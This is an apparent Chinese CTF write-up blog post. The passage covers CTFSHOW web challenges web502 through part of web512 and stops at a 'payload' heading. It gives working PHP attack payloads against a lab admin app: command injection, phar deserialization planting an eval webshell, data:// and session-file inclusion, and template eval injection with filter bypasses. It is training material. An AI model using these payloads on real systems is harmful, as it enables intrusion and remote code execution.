@@ -1,0 +1,279 @@
+<!doctype html>
+<html lang="zh"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><title>CTFSHOW 中期测评（二） web502 - web516 - WayneJH Blog</title><link rel="manifest" href="/manifest.json"><meta name="application-name" content="WayneJH Blog"><meta name="msapplication-TileImage" content="https://oss.waynejoons.icu/picphoto/favicon.ico"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-title" content="WayneJH Blog"><meta name="apple-mobile-web-app-status-bar-style" content="default"><meta name="description" content="Welcome to WayneJH Blog - CTF writeups and cybersecurity insights. Here you can learn a lot about cybersecurity knowledge"><meta property="og:type" content="blog"><meta property="og:title" content="CTFSHOW 中期测评（二） web502 - web516"><meta property="og:url" content="https://waynejoon.github.io/posts/ctfshow-mid-term-assessment-2-web502-web516/"><meta property="og:site_name" content="WayneJH Blog"><meta property="og:description" content="Welcome to WayneJH Blog - CTF writeups and cybersecurity insights. Here you can learn a lot about cybersecurity knowledge"><meta property="og:locale" content="zh_CN"><meta property="og:image" content="https://waynejoon.github.io/img/waynejoon.jpg"><meta property="article:published_time" content="2025-09-23T13:57:34.000Z"><meta property="article:modified_time" content="2025-09-23T13:57:59.312Z"><meta property="article:author" content="WayneJoon.H"><meta property="article:tag" content="CTFSHOW"><meta property="article:tag" content="CTF练习"><meta property="twitter:card" content="summary"><meta property="twitter:image:src" content="https://waynejoon.github.io/img/waynejoon.jpg"><script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"https://waynejoon.github.io/posts/ctfshow-mid-term-assessment-2-web502-web516/"},"headline":"CTFSHOW 中期测评（二） web502 - web516","image":["https://waynejoon.github.io/img/waynejoon.jpg"],"datePublished":"2025-09-23T13:57:34.000Z","dateModified":"2025-09-23T13:57:59.312Z","author":{"@type":"Person","name":"WayneJoon.H"},"publisher":{"@type":"Organization","name":"WayneJH Blog","logo":{"@type":"ImageObject","url":{"text":"WayneJH"}}},"description":"CTFSHOW 中期测评第二部分详细题解"}</script><link rel="canonical" href="https://waynejoon.github.io/posts/ctfshow-mid-term-assessment-2-web502-web516/"><link rel="icon" href="https://oss.waynejoons.icu/picphoto/favicon.ico"><link rel="stylesheet" href="https://use.fontawesome.com/releases/v6.0.0/css/all.css"><link data-pjax rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@11.7.0/styles/atom-one-light.css"><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Ubuntu:wght@400;600&amp;family=Source+Code+Pro"><link data-pjax rel="stylesheet" href="/css/default.css"><style>body>.footer,body>.navbar,body>.section{opacity:0}</style><!--!--><!--!--><!--!--><script src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" defer></script><!--!--><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lightgallery@1.10.0/dist/css/lightgallery.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/justifiedGallery@3.8.1/dist/css/justifiedGallery.min.css"><!--!--><!--!--><!--!--><style>.pace{-webkit-pointer-events:none;pointer-events:none;-webkit-user-select:none;-moz-user-select:none;user-select:none}.pace-inactive{display:none}.pace .pace-progress{background:#3273dc;position:fixed;z-index:2000;top:0;right:100%;width:100%;height:2px}</style><script src="https://cdn.jsdelivr.net/npm/pace-js@1.2.4/pace.min.js"></script><!--!--><!--!--><!-- hexo injector head_end start --><script>
+  (function () {
+      function switchTab() {
+          if (!location.hash) {
+            return;
+          }
+
+          const id = '#' + CSS.escape(location.hash.substring(1));
+          const $tabMenu = document.querySelector(`.tabs a[href="${id}"]`);
+          if (!$tabMenu) {
+            return;
+          }
+
+          const $tabMenuContainer = $tabMenu.parentElement.parentElement;
+          Array.from($tabMenuContainer.children).forEach($menu => $menu.classList.remove('is-active'));
+          Array.from($tabMenuContainer.querySelectorAll('a'))
+              .map($menu => document.getElementById($menu.getAttribute("href").substring(1)))
+              .forEach($content => $content.classList.add('is-hidden'));
+
+          if ($tabMenu) {
+              $tabMenu.parentElement.classList.add('is-active');
+          }
+          const $activeTab = document.querySelector(id);
+          if ($activeTab) {
+              $activeTab.classList.remove('is-hidden');
+          }
+      }
+      switchTab();
+      window.addEventListener('hashchange', switchTab, false);
+  })();
+  </script><!-- hexo injector head_end end --><meta name="generator" content="Hexo 7.3.0"><link rel="alternate" href="/atom.xml" title="WayneJH Blog" type="application/atom+xml">
+</head><body class="is-3-column"><nav class="navbar navbar-main"><div class="container navbar-container"><div class="navbar-brand justify-content-center"><a class="navbar-item navbar-logo" href="/">WayneJH</a></div><div class="navbar-menu"><div class="navbar-start"><a class="navbar-item" href="/">首页</a><a class="navbar-item" href="/archives">归档</a><a class="navbar-item" href="/categories">分类</a><a class="navbar-item" href="/tags">标签</a><a class="navbar-item" href="/links">友链</a><a class="navbar-item" href="/about">关于</a></div><div class="navbar-end"><a class="navbar-item" target="_blank" rel="noopener" title="GitHub" href="https://github.com/waynejoon"><i class="fab fa-github"></i></a><a class="navbar-item is-hidden-tablet catalogue" title="目录" href="javascript:;"><i class="fas fa-list-ul"></i></a><a class="navbar-item search" title="搜索" href="javascript:;"><i class="fas fa-search"></i></a></div></div></div></nav><section class="section"><div class="container"><div class="columns"><div class="column order-2 column-main is-8-tablet is-8-desktop is-8-widescreen"><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item"><time dateTime="2025-09-23T13:57:34.000Z" title="2025/9/23 21:57:34">2025-09-23</time>发表</span><span class="level-item"><a class="link-muted" href="/categories/CTFSHOW/">CTFSHOW</a></span><span class="level-item">24 分钟读完 (大约3549个字)</span><span class="level-item" id="busuanzi_container_page_pv" style="display:none"><span id="busuanzi_value_page_pv">--</span>次访问</span></div></div><h1 class="title is-3 is-size-4-mobile">CTFSHOW 中期测评（二） web502 - web516</h1><div class="content"><h2 id="题目列表"><a href="#题目列表" class="headerlink" title="题目列表"></a>题目列表</h2><h3 id="web502"><a href="#web502" class="headerlink" title="web502"></a>web502</h3><p>先万能密码登录</p>
+<p><img src="https://oss.waynejoons.icu/picphoto/20250921112546124.png"></p>
+<p>打开数据库备份功能页面</p>
+<p><img src="https://oss.waynejoons.icu/picphoto/20250921112615718.png"></p>
+<p>打开网页源码，可以看到POST请求是发送到<code>api/admin_db_backup.php</code>的</p>
+<p><img src="https://oss.waynejoons.icu/picphoto/20250921112651193.png"></p>
+<p>查看<code>api/admin_db_backup.php</code>源码，GET请求<code>/index.php?action=../api/admin_db_backup</code></p>
+<p><img src="https://oss.waynejoons.icu/picphoto/20250921112838652.png"></p>
+<p>相比上题，这里的正则改成了<code>preg_match(&#39;/^(zip|tar|sql)$/&#39;, $db_format)</code>，要求<code>$db_format</code>只能严格匹配 “zip”、”tar”、”sql” 这三个字符串，任何多余字符都不会通过，那我们换个方法，可以利用<code>$pre</code>进行变量覆盖然后分号截断执行命令</p>
+<p>payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">db_format=zip&amp;pre=1.txt;cat /f*&gt;/var/www/html/1.txt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://oss.waynejoons.icu/picphoto/20250921113226519.png"></p>
+<p>最后访问<code>/1.txt</code>读取flag即可</p>
+<p><img src="https://oss.waynejoons.icu/picphoto/20250921113336443.png"></p>
+<h3 id="web503"><a href="#web503" class="headerlink" title="web503"></a>web503</h3><p><code>$pre</code>和<code>$db_format</code>被md5包裹了，无法利用了</p>
+<p><img src="https://oss.waynejoons.icu/picphoto/20250921145345667.png"></p>
+<p>然后上面可以看到有个<code>file_exists</code>函数，先记着，后面会用到</p>
+<p><img src="https://oss.waynejoons.icu/picphoto/20250921163100598.png"></p>
+<p>用万能密码登录首页后，在系统配置功能处可以看到有个图片上传功能</p>
+<p><img src="https://oss.waynejoons.icu/picphoto/20250921163347821.png"></p>
+<p>查看源码看到有个<code>api/admin_upload.php</code>，跟文件上传功能有关</p>
+<p><img src="https://oss.waynejoons.icu/picphoto/20250921163440917.png"></p>
+<p>我们看看源码，GET传参<code>/index.php?action=../api/admin_upload</code>，这里只截取关键代码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$user</span>)&#123;</span><br><span class="line">	<span class="variable">$arr</span> = <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>];</span><br><span class="line">	<span class="keyword">if</span>((<span class="variable">$arr</span>[<span class="string">&quot;type&quot;</span>]==<span class="string">&quot;image/jpeg&quot;</span> || <span class="variable">$arr</span>[<span class="string">&quot;type&quot;</span>]==<span class="string">&quot;image/png&quot;</span> ) &amp;&amp; <span class="variable">$arr</span>[<span class="string">&quot;size&quot;</span>]&lt;<span class="number">10241000</span> )</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="variable">$arr</span>[<span class="string">&quot;tmp_name&quot;</span>];</span><br><span class="line">		<span class="variable">$filename</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$arr</span>[<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">		<span class="variable">$ext</span> = <span class="title function_ invoke__">pathinfo</span>(<span class="variable">$arr</span>[<span class="string">&#x27;name&#x27;</span>],PATHINFO_EXTENSION);</span><br><span class="line">		<span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^php$/i&#x27;</span>, <span class="variable">$ext</span>))&#123;</span><br><span class="line">			<span class="variable">$basename</span> = <span class="string">&quot;../img/&quot;</span>.<span class="variable">$filename</span>.<span class="string">&#x27;.&#x27;</span> . <span class="variable">$ext</span>;</span><br><span class="line">			<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$arr</span>[<span class="string">&quot;tmp_name&quot;</span>],<span class="variable">$basename</span>);</span><br><span class="line">			<span class="variable">$config</span> = <span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="keyword">__DIR__</span>.<span class="string">&#x27;/../config/settings&#x27;</span>));</span><br><span class="line">			<span class="variable">$config</span>[<span class="string">&#x27;logo&#x27;</span>]=<span class="variable">$filename</span>.<span class="string">&#x27;.&#x27;</span> . <span class="variable">$ext</span>;</span><br><span class="line">			<span class="title function_ invoke__">file_put_contents</span>(<span class="keyword">__DIR__</span>.<span class="string">&#x27;/../config/settings&#x27;</span>, <span class="title function_ invoke__">serialize</span>(<span class="variable">$config</span>));</span><br><span class="line">			<span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;文件上传成功&#x27;</span>;</span><br><span class="line">		&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里判断文件 MIME 类型是否是 JPEG 或 PNG，并且文件大小要小于10MB，且禁止扩展名为“php”的文件上传，然后对内容进行反序列化。结合前面<code>/api/admin_db_backup.php</code>的<code>file_exists</code>函数，我们可以用phar反序列化来做</p>
+<p>这里要用到之前题目讲的反序列化，具体可以参考web493，setStub那里要加个<code>GIF89a</code>来伪装图片</p>
+<p>payload：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">dbLog</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$sql</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$content</span> = <span class="string">&#x27;&lt;?php eval($_POST[1]);?&gt;&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$log</span> = <span class="string">&#x27;1.php&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">dbLog</span>();</span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&#x27;a.phar&#x27;</span>);</span><br><span class="line"><span class="variable">$phar</span> -&gt; <span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"><span class="variable">$phar</span> -&gt; <span class="title function_ invoke__">addFromString</span>(<span class="string">&#x27;test.txt&#x27;</span>,<span class="string">&#x27;test&#x27;</span>);</span><br><span class="line"><span class="variable">$phar</span> -&gt; <span class="title function_ invoke__">setStub</span>(<span class="string">&#x27;GIF89a&#x27;</span>.<span class="string">&#x27;&lt;?php __HALT_COMPILER(); ?&gt;&#x27;</span>);</span><br><span class="line"><span class="variable">$phar</span> -&gt; <span class="title function_ invoke__">setMetadata</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$phar</span> -&gt; <span class="title function_ invoke__">stopBuffering</span>();  </span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>运行后当前目录会生成一个<code>a.phar</code>文件，修改文件后缀名为png，然后上传到系统配置那里</p>
+<p><img src="https://oss.waynejoons.icu/picphoto/20250921165428098.png"></p>
+<p>右键图像复制图像链接，例如我这边是<code>/img/32d3ca5e23f4ccf1e4c8660c40e75f33.png</code>，接着我们要借用<code>file_exists</code>来触发phar反序列化，如图所示发包</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pre=phar:///var/www/html/img/32d3ca5e23f4ccf1e4c8660c40e75f33&amp;db_format=.png</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://oss.waynejoons.icu/picphoto/20250921165813237.png"></p>
+<p>最后再蚁剑连接即可</p>
+<p><img src="https://oss.waynejoons.icu/picphoto/20250921170037602.png"></p>
+<p>根目录找到flag</p>
+<p><img src="https://oss.waynejoons.icu/picphoto/20250921170112087.png"></p>
+<h3 id="web504"><a href="#web504" class="headerlink" title="web504"></a>web504</h3><p>这次发现这里多了模板添加功能，但是查看不了源码</p>
+<p><img src="https://oss.waynejoons.icu/picphoto/20250922111222469.png"></p>
+<p>可以上传文件</p>
+<p><img src="https://oss.waynejoons.icu/picphoto/20250922111506445.png"></p>
+<p>参考我们之前做的web499，可以尝试写序列化代码到<code>config/settings</code>，等网页加载时会进行反序列化然后生成木马</p>
+<p>payload：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">dbLog</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$sql</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$content</span> = <span class="string">&#x27;&lt;?php eval($_POST[1]);?&gt;&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$log</span> = <span class="string">&#x27;2.php&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">dbLog</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>得到结果</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:5:&quot;dbLog&quot;:3:&#123;s:3:&quot;sql&quot;;N;s:7:&quot;content&quot;;s:24:&quot;&lt;?php eval($_POST[1]);?&gt;&quot;;s:3:&quot;log&quot;;s:5:&quot;2.php&quot;;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>然后进行上传，如图所示</p>
+<p><img src="https://oss.waynejoons.icu/picphoto/20250922112040039.png"></p>
+<p>这时点击系统配置功能处，可以看到内容已经写入，并覆盖了原来的内容</p>
+<p><img src="https://oss.waynejoons.icu/picphoto/20250922112102976.png"></p>
+<p>蚁剑连接<code>2.php</code></p>
+<p><img src="https://oss.waynejoons.icu/picphoto/20250922112222128.png"></p>
+<p>根目录找到flag</p>
+<p><img src="https://oss.waynejoons.icu/picphoto/20250922112258650.png"></p>
+<h3 id="web505"><a href="#web505" class="headerlink" title="web505"></a>web505</h3><p>这次文件上传不了，应该是后端做了校验</p>
+<p><img src="https://oss.waynejoons.icu/picphoto/20250922113022825.png"></p>
+<p>但是发现多了一个文件查看功能，可以查看文件源码</p>
+<p><img src="https://oss.waynejoons.icu/picphoto/20250922113648855.png"></p>
+<p>我们看看<code>api/admin_templates.php</code>源码，可以看到把<code>settings</code>过滤了</p>
+<p><img src="https://oss.waynejoons.icu/picphoto/20250922113800382.png"></p>
+<p>在文件查看功能处查看源码，找到<code>api/admin_file_view.php</code>，我们看看源码</p>
+<p><img src="https://oss.waynejoons.icu/picphoto/20250922113949545.png"></p>
+<p>关键源码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$user</span>)&#123;</span><br><span class="line">	<span class="title function_ invoke__">extract</span>(<span class="variable">$_POST</span>);</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$debug</span>==<span class="number">1</span> &amp;&amp; <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^user/&#x27;</span>, <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$f</span>)))&#123;</span><br><span class="line">		<span class="keyword">include</span>(<span class="variable">$f</span>);</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="variable">$ret</span>[<span class="string">&#x27;data&#x27;</span>]=<span class="keyword">array</span>(<span class="string">&#x27;contents&#x27;</span>=&gt;<span class="title function_ invoke__">file_get_contents</span>(<span class="keyword">__DIR__</span>.<span class="string">&#x27;/../&#x27;</span>.<span class="variable">$name</span>));</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;查看成功&#x27;</span>;</span><br><span class="line">	<span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>));</span><br></pre></td></tr></table></figure>
+
+<p>可以看到当满足<code>$debug==1</code>且<code>$f</code>以user开头，就用<code>include</code>进行文件包含。我们可以用data伪协议来做，然后发送内容到<code>api/admin_file_view.php</code></p>
+<p>payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">debug=1&amp;f=data://text/plain,user&lt;?php system(&#x27;cat /f*&#x27;);?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>结果如图所示</p>
+<p><img src="https://oss.waynejoons.icu/picphoto/20250922115920248.png"></p>
+<h3 id="web506"><a href="#web506" class="headerlink" title="web506"></a>web506</h3><p>这题的<code>api/admin_file_view.php</code>相比上题，多了一个判断文件名后缀的代码，取 <code>$f</code> 文件名的最后三个字符，如果扩展名是 <code>php</code>、<code>sml</code> 或 <code>phar</code>（不区分大小写），则直接返回提示、终止流程</p>
+<p><img src="https://oss.waynejoons.icu/picphoto/20250922121113046.png"></p>
+<p>不过不影响，我们用的是data伪协议，步骤跟上题一样</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">debug=1&amp;f=data://text/plain,user&lt;?php system(&#x27;cat /f*&#x27;);?&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://oss.waynejoons.icu/picphoto/20250922121329314.png"></p>
+<h3 id="web507"><a href="#web507" class="headerlink" title="web507"></a>web507</h3><p><code>api/admin_file_view.php</code>没变，继续用上题方法</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">debug=1&amp;f=data://text/plain,user&lt;?php system(&#x27;cat /f*&#x27;);?&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://oss.waynejoons.icu/picphoto/20250922133320354.png"></p>
+<h3 id="web508"><a href="#web508" class="headerlink" title="web508"></a>web508</h3><p>这次把伪协议禁了，不能直接写伪协议，不过我们可以换个方法，用一个文件来当中转站执行命令</p>
+<p><img src="https://oss.waynejoons.icu/picphoto/20250922144733981.png"></p>
+<p>在系统配置那里可以看到有个网站Logo上传，可以用这个当中转站</p>
+<p><img src="https://oss.waynejoons.icu/picphoto/20250922144933602.png"></p>
+<p>随便上传一张图片，抓包，然后修改内容为<code>user&lt;?php system(&#39;cat /f*&#39;);?&gt;</code>，重新发包</p>
+<p><img src="https://oss.waynejoons.icu/picphoto/20250922145710932.png"></p>
+<p>然后回到网页，右键复制图像链接，发送POST请求到<code>api/admin_file_view.php</code>，如图所示</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">debug=1&amp;f=/var/www/html/img/4a47a0db6e60853dedfcfdf08a5ca249.png</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://oss.waynejoons.icu/picphoto/20250922145910491.png"></p>
+<h3 id="web509"><a href="#web509" class="headerlink" title="web509"></a>web509</h3><p>这次<code>api/admin_upload.php</code>会对文件内容进行校验</p>
+<p><img src="https://oss.waynejoons.icu/picphoto/20250922150804490.png"></p>
+<p>用短回显标签和反引号绕过即可</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">user&lt;?=`cat /f*`?&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://oss.waynejoons.icu/picphoto/20250922151309377.png"></p>
+<p>右键复制图像链接，发送POST请求到<code>api/admin_file_view.php</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">debug=1&amp;f=/var/www/html/img/4a47a0db6e60853dedfcfdf08a5ca249.png</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://oss.waynejoons.icu/picphoto/20250922151431080.png"></p>
+<h3 id="web510"><a href="#web510" class="headerlink" title="web510"></a>web510</h3><p>这次文件上传限制很严格，换个方法</p>
+<p><img src="https://oss.waynejoons.icu/picphoto/20250922152524400.png"></p>
+<p>通过分析，发现个人信息修改处存在漏洞</p>
+<p><img src="https://oss.waynejoons.icu/picphoto/20250922154404263.png"></p>
+<p><img src="https://oss.waynejoons.icu/picphoto/20250922154450137.png"></p>
+<p>我们看看<code>api/admin_edit.php</code>对应的源码</p>
+<p><img src="https://oss.waynejoons.icu/picphoto/20250922154859401.png"></p>
+<p>回到个人信息处查看源码，显示昵称对应的就是<code>nickname</code>，那我们可以用session文件包含来做这题</p>
+<p><img src="https://oss.waynejoons.icu/picphoto/20250922154932073.png"></p>
+<p>看看对应的session文件，在cookie复制<code>PHPSESSID</code>的值，然后拼接访问，如图</p>
+<p><img src="https://oss.waynejoons.icu/picphoto/20250922155258768.png"></p>
+<p>刚好前面有个user，符合<code>api/admin_file_view.php</code>的要求，我们在名称修改处传入一句话木马，然后进行文件包含即可</p>
+<p><img src="https://oss.waynejoons.icu/picphoto/20250922155621775.png"></p>
+<p>剩余的步骤跟之前一样，发送POST请求到<code>api/admin_file_view.php</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">debug=1&amp;f=/tmp/sess_k9u1ni1spqatv8uvt3acr416o6&amp;1=system(&#x27;cat /f*&#x27;);</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://oss.waynejoons.icu/picphoto/20250922160203494.png"></p>
+<h3 id="web511"><a href="#web511" class="headerlink" title="web511"></a>web511</h3><p>这次把sess也过滤了</p>
+<p><img src="https://oss.waynejoons.icu/picphoto/20250922193901284.png"></p>
+<p>一个个分析其他代码，发现<code>render/render_class.php</code>有个<code>eval</code>函数</p>
+<p><img src="https://oss.waynejoons.icu/picphoto/20250922202720061.png"></p>
+<p>我们看看能不能利用，也是同一个文件，在上面可以看到<code>shade</code>函数调用了<code>checkVar</code>，然后<code>render</code>函数调用了<code>shade</code></p>
+<p><img src="https://oss.waynejoons.icu/picphoto/20250922204215712.png"></p>
+<p>后面在<code>index.php</code>发现调用了<code>render</code>，GET传入<code>?action=view&amp;page=1</code>即可，关键是<code>$user</code>如何控制，且要求是个数组</p>
+<p><img src="https://oss.waynejoons.icu/picphoto/20250922204331037.png"></p>
+<p>继续分析，发现<code>api/admin_edit.php</code>可以控制user数组，那我们只要nickname传入要执行的命令，然后修改前面的模板占位符为<code>&#123;&#123;var:nickname&#125;&#125;</code>即可</p>
+<p><img src="https://oss.waynejoons.icu/picphoto/20250922204605304.png"></p>
+<p>修改nickname执行命令</p>
+<p><img src="https://oss.waynejoons.icu/picphoto/20250922205034121.png"></p>
+<p>然后打开新增模板功能，名称写<code>1.sml</code>，因为后面我们要GET传入<code>?action=view&amp;page=1</code>，要跟page对应，然后内容写<code>1&#123;&#123;var:nickname&#125;&#125;</code>，用于模板渲染。</p>
+<p>加个1是因为<code>render/render_class.php</code>中<code>if(stripos($templateContent, &#39;&#123;&#123;var:'.$key.'&#125;&#125;&#39;))&#123;</code>这里有问题，如果是在开头匹配到的话会返回下标0，然后<code>if(0)</code>就不会进入语句块，也就无法执行eval，正确写法应该是</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">stripos</span>(<span class="variable">$templateContent</span>, <span class="string">&#x27;&#123;&#123;var:&#x27;</span>.<span class="variable">$key</span>.<span class="string">&#x27;&#125;&#125;&#x27;</span>) !== <span class="literal">false</span>)&#123;</span><br></pre></td></tr></table></figure>
+
+<p>回归正题，我们传入内容如图所示</p>
+<p><img src="https://oss.waynejoons.icu/picphoto/20250922210955246.png"></p>
+<p>然后访问<code>index.php?action=view&amp;page=1</code>触发漏洞即可</p>
+<p><img src="https://oss.waynejoons.icu/picphoto/20250922211027918.png"></p>
+<h3 id="web512"><a href="#web512" class="headerlink" title="web512"></a>web512</h3><p>这次<code>render/render_class.php</code>对<code>$value</code>过滤很严格，字符可以用字符串拼接绕过，然后因为括号()用不了，我们用include来包含文件，include是可以不用括号包裹直接用的</p>
+<p><img src="https://oss.waynejoons.icu/picphoto/20250922214209598.png"></p>
+<p>因为网站的php版本为5.6，且正则没有过滤花括号，可以用<code>$_POST&#123;1&#125;</code>来代替<code>$_POST[1]</code>，旧版 PHP 允许使用花括号 <code>&#123;&#125;</code> 访问数组某个键，比如 <code>$_POST&#123;1&#125;</code>，这是 PHP 早期版本的语法，但从 PHP 7.4 开始，花括号访问数组的语法被废弃并在 PHP 8.0 中移除</p>
+<p><img src="https://oss.waynejoons.icu/picphoto/20250922215057626.png"></p>
+<p>那我们要写入的命令为</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">include</span> <span class="variable">$_POST</span>&#123;<span class="number">1</span>&#125;;<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>网上看别的师傅有一个很牛的方法，可以用heredoc语法来定义长字符串，它允许开发者定义多行字符串而不需要使用引号，也不用为引号、换行符等转义，非常方便地写包含多行HTML、SQL、代码片段等内容的字符串，格式为</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$变量名 = &lt;&lt;&lt;标识符</span><br><span class="line">多行字符串内容</span><br><span class="line">标识符;</span><br></pre></td></tr></table></figure>
+
+<p><code>&lt;&lt;&lt;</code> 是heredoc开始的标记，后面跟一个自定义的标识符，直到文件中某一行独立写着完全相同的结束标识符就结束，结束标识符后必须加分号<code>;</code>结束</p>
+<p>这里要用到之前的反序列化知识，具体可以回顾web493</p>
+<p>payload：</p>
